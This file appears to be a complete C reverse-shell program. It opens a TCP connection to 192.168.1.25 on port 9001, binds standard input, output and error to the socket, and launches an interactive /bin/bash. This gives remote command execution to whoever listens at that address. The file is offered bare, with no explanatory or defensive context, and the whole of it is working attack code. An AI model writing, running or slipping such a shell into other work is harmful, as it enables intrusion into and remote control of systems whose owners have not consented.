#include<arpa/inet.h>
#include<stdio.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include <unistd.h>
#include<string.h>
#include<stdlib.h>

int main() {
        // Address struct
        struct sockaddr_in shell_addr;

        // Connection variable
        int connection;

        int shell;

        // Server data
        char ip_addr[] = "192.168.1.25";
        int port = 9001;

        // Creating + configuring socket
        shell = socket(AF_INET, SOCK_STREAM, 0);
        shell_addr.sin_port = htons(port);
        shell_addr.sin_family = AF_INET;
        shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

        // Connecting
        connection = connect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr));

        if (connection < 0) {
                printf("[!] Socket Connection Error. \n");
                exit(0);
        } else {
                // Redirect stdin, stdout, stderr to the socket
                dup2(shell, 0);
                dup2(shell, 1);
                dup2(shell, 2);

                // Execute a shell
                execl("/bin/bash", "bash", "-i",  NULL);

        }
        return 0;
}
